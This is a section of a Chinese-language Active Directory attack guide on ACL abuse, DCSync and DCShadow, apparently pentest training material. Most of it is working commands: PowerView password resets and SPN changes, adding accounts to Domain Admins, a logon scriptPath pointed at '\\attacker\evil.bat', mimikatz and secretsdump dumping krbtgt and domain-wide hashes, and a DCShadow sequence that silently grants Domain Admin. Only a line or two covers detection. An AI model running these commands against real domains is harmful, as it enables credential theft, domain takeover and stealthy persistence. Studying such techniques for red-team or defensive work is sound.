## 7. ACL 滥用与权限提升

AD 的权限通过 ACL(Access Control List) 管理。若低权限账户对高权限对象有过宽的 ACL(如 GenericAll/ForceChangePassword)，即可借此提权。BloodHound 的核心价值正是发现这些 ACL 路径。

### 7.1 关键 ACL 权限与利用

| ACL权限 | 含义 | 利用方式 |
|---------|------|---------|
| `GenericAll` | 完全控制(读/写/删) | 改密码/改ACL/加组成员 |
| `GenericWrite` | 写所有可写属性 | 改SPN(Kerberoasting)/改scriptPath(登录执行) |
| `WriteDacl` | 可改ACL | 给自己加GenericAll |
| `WriteOwner` | 可改所有者 | 改所有者为→自己→改ACL→GenericAll |
| `ForceChangePassword` | 可强制改密码 | 重置目标密码直接登录 |
| `Self` (Self-Membership) | 可加自己到组 | 加入Domain Admins |
| `WriteProperty` (Member) | 可改组成员 | 加任意账户到组 |

### 7.2 GenericAll 提权

对目标用户有 GenericAll 即可改其密码：

```powershell
# PowerView 改密码
Set-DomainUserPassword -Identity targetuser -AccountPassword $(ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)

# 或加自己到目标所在的高权限组
net group "Domain Admins" lowpriv /add /domain
# 若对Domain Admins组有GenericAll/Self-MembersHIP
```

### 7.3 GenericWrite 利用

```powershell
# 1. 改SPN触发Kerberoasting(对用户有GenericWrite)
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/SPN'}
# 然后Kerberoasting该用户(见§3.3)

# 2. 改scriptPath(登录时执行脚本，需用户重新登录)
Set-DomainObject -Identity targetuser -Set @{scriptpath='\\attacker\evil.bat'}

# 3. 改msDS-AllowedToActOnBehalfOfOtherIdentity(触发RBCD，见§4.6)
```

### 7.4 DCSync

DCSync 是**无需登录域控即可拉取任意账户哈希**的攻击——通过 DRSUAPI(目录复制服务)协议模拟域控的复制请求，DC 会把账户哈希(含 krbtgt)发送过来。只需对域有 `GetChanges` + `GetChangesAll` 权限(通常是 Domain Admins/DC/Replication 权限)。

```bash
# 1. 检查是否有DCSync权限(BloodHound: Find Principals with DCSync Rights)
# 通常是Domain Admins、Domain Controllers、Enterprise DCs组成员
# 或显式被授予Replicating Directory Changes权限

# 2. 拉取krbtgt哈希 (mimikatz)
mimikatz # lsadump::dcsync /user:corp\krbtgt

# 3. 拉取指定用户哈希
mimikatz # lsadump::dcsync /user:corp\Administrator

# 4. 拉取全域哈希 (impacket secretsdump)
secretsdump.py corp.local/Administrator:Pass@10.0.0.1 -just-dc
# -just-dc 仅域哈希(NTDS)，不含本地
secretsdump.py corp.local/user:Pass@dc01 -just-dc-ntlm      # 仅NTLM哈希
```

> **要点**：DCSync 是从普通域权限到全域控制的关键一跃——拿到 krbtgt 哈希即可铸 Golden Ticket 持久化。防御：监控 DRSUAPI(ID 4662，含 1131f6aa/1131f6ad 复制权限)的非 DC 账户调用。

### 7.5 DCShadow

DCShadow 是 DCSync 的"反向"——攻击者**注册一个伪造的域控**，向真实 DC 推送伪造的目录变更(如修改某账户的 memberOf/特权)。与 DCSync 拉取数据不同，DCShadow 推送数据，可静默修改域对象而不留标准审计日志(因为变更看似来自合法DC)。

```bash
# 1. 需Domain Admin权限，且需在DC注册SPN(伪装为DC) + 修改配置
# Mimikatz DCShadow
mimikatz # !+
mimikatz # !processtoken                       # 提升到SYSTEM
# 注册伪造DC (需对Configuration命名空间写权限)
mimikatz # lsadump::dcshadow /object:CN=targetuser /attribute:primaryGroupID /value:512
# 把targetuser的primaryGroupID改为512(Domain Admins)

# 2. 触发复制推送
mimikatz # lsadump::dcshadow /push

# 3. 清理(注销伪造DC)
mimikatz # !-
```

**DCSync vs DCShadow**：

| 维度 | DCSync | DCShadow |
|------|--------|----------|
| 方向 | 拉取(读) | 推送(写) |
| 用途 | 获取哈希 | 修改域对象 |
| 审计 | 有4662日志 | 变更看似合法DC，难检测 |
| 权限 | Replication权限 | DA + 配置写权限 |
| 持久化 | Golden Ticket | 静默提权/植入后门属性 |

---

